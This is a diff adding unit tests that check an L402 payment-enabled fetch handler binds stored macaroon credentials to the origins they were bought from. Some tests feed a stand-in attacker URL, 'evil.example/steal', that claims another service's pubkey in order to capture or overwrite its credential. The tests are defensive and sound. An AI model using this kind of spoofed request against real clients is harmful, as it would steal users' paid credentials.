@@ -321,6 +321,80 @@ describe('handleFetch security', () => {
     })
   })
 
+  describe('stored credentials go only to the origins they were bought from', () => {
+    const X = 'pubkey-of-service-x'
+    const goodCred = { origins: ['https://good.example'], macaroon: 'bWFjMQ==', preimage: 'a'.repeat(64) }
+
+    function storeWith(entries: Record<string, unknown>) {
+      return {
+        get: vi.fn((k: string) => entries[k]),
+        set: vi.fn(),
+        delete: vi.fn(),
+        updateBalance: vi.fn(),
+        updateLastUsed: vi.fn(),
+      } as unknown as FetchDeps['credentialStore']
+    }
+
+    it('does not send a service credential to another origin that names its pubkey', async () => {
+      const fetchMock = vi.fn().mockResolvedValue(mockResponse(200, {}, 'ok'))
+      const store = storeWith({ [X]: goodCred })
+      await handleFetch({ url: 'https://evil.example/steal', pubkey: X }, makeDeps({ fetchFn: fetchMock as unknown as typeof fetch, credentialStore: store }))
+      expect(fetchMock.mock.calls[0][1].headers['Authorization']).toBeUndefined()
+      expect(store.updateLastUsed).not.toHaveBeenCalled()
+    })
+
+    it('neither deletes nor overwrites the real credential when the other origin charges', async () => {
+      const store = storeWith({ [X]: goodCred })
+      const deps = makeDeps({
+        credentialStore: store,
+        fetchFn: vi.fn()
+          .mockResolvedValueOnce(mockResponse(402, { 'www-authenticate': 'L402 macaroon="bWFjMg==", invoice="lnbc50n1test"' }, '{}'))
+          .mockResolvedValueOnce(mockResponse(200)) as unknown as typeof fetch,
+        parseL402: vi.fn().mockReturnValue({ macaroon: 'bWFjMg==', invoice: 'lnbc50n1test' }),
+        decodeBolt11: vi.fn().mockReturnValue({ costSats: 50, paymentHash: 'hash1', expiry: 3600 }),
+        payInvoice: vi.fn().mockResolvedValue({ paid: true, preimage: 'b'.repeat(64), method: 'nwc' }),
+      })
+      await handleFetch({ url: 'https://evil.example/steal', pubkey: X, autoPay: true }, deps)
+      expect(store.delete).not.toHaveBeenCalled()
+      expect(store.set).toHaveBeenCalledWith('https://evil.example', expect.objectContaining({ origins: ['https://evil.example'] }))
+      expect(store.set).not.toHaveBeenCalledWith(X, expect.anything())
+    })
+
+    it('sends a credential across the transports it was bought for', async () => {
+      const fetchMock = vi.fn()
+      const transportFetch = vi.fn().mockResolvedValue(mockResponse(200))
+      const store = storeWith({ [X]: { ...goodCred, origins: ['https://good.example', 'http://good.onion'] } })
+      await handleFetch({
+        url: 'https://good.example/a',
+        urls: ['https://good.example/a', 'http://good.onion/a'],
+        pubkey: X,
+      }, makeDeps({ fetchFn: fetchMock as unknown as typeof fetch, transportFetch: transportFetch as unknown as FetchDeps['transportFetch'], credentialStore: store }))
+      expect(transportFetch.mock.calls[0][1].headers['Authorization']).toBe(`L402 bWFjMQ==:${'a'.repeat(64)}`)
+    })
+
+    it('does not send a pubkey-keyed credential that has no recorded origins', async () => {
+      const fetchMock = vi.fn().mockResolvedValue(mockResponse(200))
+      const store = storeWith({ [X]: { macaroon: 'bWFjMQ==', preimage: 'a'.repeat(64) } })
+      await handleFetch({ url: 'https://good.example/a', pubkey: X }, makeDeps({ fetchFn: fetchMock as unknown as typeof fetch, credentialStore: store }))
+      expect(fetchMock.mock.calls[0][1].headers['Authorization']).toBeUndefined()
+    })
+
+    it('binds a newly bought credential to the origins it was bought from', async () => {
+      const store = storeWith({})
+      const deps = makeDeps({
+        credentialStore: store,
+        fetchFn: vi.fn()
+          .mockResolvedValueOnce(mockResponse(402, { 'www-authenticate': 'L402 macaroon="bWFjMg==", invoice="lnbc50n1test"' }, '{}'))
+          .mockResolvedValueOnce(mockResponse(200)) as unknown as typeof fetch,
+        parseL402: vi.fn().mockReturnValue({ macaroon: 'bWFjMg==', invoice: 'lnbc50n1test' }),
+        decodeBolt11: vi.fn().mockReturnValue({ costSats: 50, paymentHash: 'hash1', expiry: 3600 }),
+        payInvoice: vi.fn().mockResolvedValue({ paid: true, preimage: 'b'.repeat(64), method: 'nwc' }),
+      })
+      await handleFetch({ url: 'https://good.example/a', pubkey: X, autoPay: true }, deps)
+      expect(store.set).toHaveBeenCalledWith(X, expect.objectContaining({ origins: ['https://good.example'] }))
+    })
+  })
+
   it('strips dangerous hop-by-hop headers from user input', async () => {
     const fetchMock = vi.fn().mockResolvedValue(mockResponse(200))
     const deps = makeDeps({
